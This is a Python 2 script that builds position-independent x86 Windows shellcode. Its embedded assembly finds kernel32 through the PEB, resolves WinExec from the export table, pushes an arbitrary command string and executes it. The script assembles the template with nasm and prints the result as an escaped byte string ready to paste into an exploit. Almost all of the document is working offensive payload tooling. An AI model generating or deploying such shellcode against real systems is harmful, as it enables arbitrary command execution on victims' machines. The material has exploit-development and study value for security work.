from binascii import unhexlify
import binascii
import sys
import os
from shell import shell
import time


if len (sys.argv) != 2 :
    print "\r"
    print "Creates x86 Windows/Exec Shellcode"
    print "Modify line 95 - arwin.exe kernel32.dll WinExec"
    print "Usage: python winexec.py 'notepad.exe'\r\n"
    print "Adds null bytes if not divisble by 4(you want this)"
    sys.exit (1)

command = sys.argv[1]
shellcommand = binascii.hexlify(command)

def reverse_bytes(Shellcode):
	ShellcodeSize = ''
	ShellcodeSize = [Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]
	if len(ShellcodeSize) % 4 != 0:
        	print "Shellcode size is not divisible by 4"
		time.sleep(1)
        	NOP = '90'
	
		if ((len(ShellcodeSize))+1) % 4 == 0:
			Shellcode += "00"
			time.sleep(1)		
		elif ((len(ShellcodeSize))+2) % 4 == 0:
			Shellcode += "90"
			Shellcode += "90"
			print "Padding shellcode with 2 NOPS.."
			time.sleep(1)
		else:
			Shellcode += "90"
			Shellcode += "90"
			Shellcode += "90"
			print "Padding shellcode with 3 NOPS.."
			time.sleep(1)
	else:
		print " Shellcode size is divisible by 4"
		time.sleep(1)
		pass

	Shellcode = "".join(([Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]))
	ShellcodeFormatted = reversed([Shellcode[i:i+8] for i in range(0, len(Shellcode), 8)])
	push = ""
	for item in ShellcodeFormatted:
		item = "".join(map(str.__add__, item[-2::-2] ,item[-1::-2]))
		push += "push 0x%s\r\n" % item
	return push

shellasm = """
; Filename: winexec.asm

BITS 32

global _start

_start:

xor ebx, ebx

;Find Kernel32 Base
mov edi, [fs:ebx+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

module_loop:
mov eax, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne module_loop

; Kernel32 PE Header
mov edi, eax
add edi, [eax+0x3c]

; Kernel32 Export Directory Table
mov edx, [edi+0x78]
add edx, eax

; Kernel32 Name Pointers
mov edi, [edx+0x20]
add edi, eax

; Find WinExec
mov ebp, ebx
name_loop:
mov esi, [edi+ebp*4]
add esi, eax
inc ebp
cmp dword [esi],0x773e5cf7 ;WinE ; 0x773e5cf7 -vista 0x77e96a85 - w2k3
jne name_loop

; WinExec Ordinal
mov edi, [edx+0x24]
add edi, eax
mov bp, [edi+ebp*2]

; WinExec Address
mov edi, [edx+0x1C]
add edi, eax
mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
add edi, eax

; Zero Memory
mov ecx, ebx
mov cl, 0xFF
zero_loop:
push ebx
loop zero_loop

; push payload here (notepad)
%s

mov edx, esp

; call WinExec
inc ecx  ; ecx=1 show window, 0=hidden (simply comment out for that)
push ecx ; window mode
push edx ; command
call edi
""" % reverse_bytes(shellcommand)
print "Writing to template...\n%s " % reverse_bytes(shellcommand)

file = open("shellcode.asm","wb")
file.write(shellasm)
file.close()

writeasm = shell('nasm shellcode.asm')
print "Creating shellcode..."

bindshell = 'winexec = "'
length = 0
with open("shellcode", "rb") as f:
    byte = f.read(1)
    while byte != "":
        if len(byte) > 0:
            bindshell += '\\x' + '%02.X' % ord(byte)
            length += 1
        byte = f.read(1)
bindshell += '"'
print "Length: %s bytes\n " % str(length)
print bindshell
# clearbin = shell('rm shellcode')
# clearasm = shell('rm shellcode.asm')
        
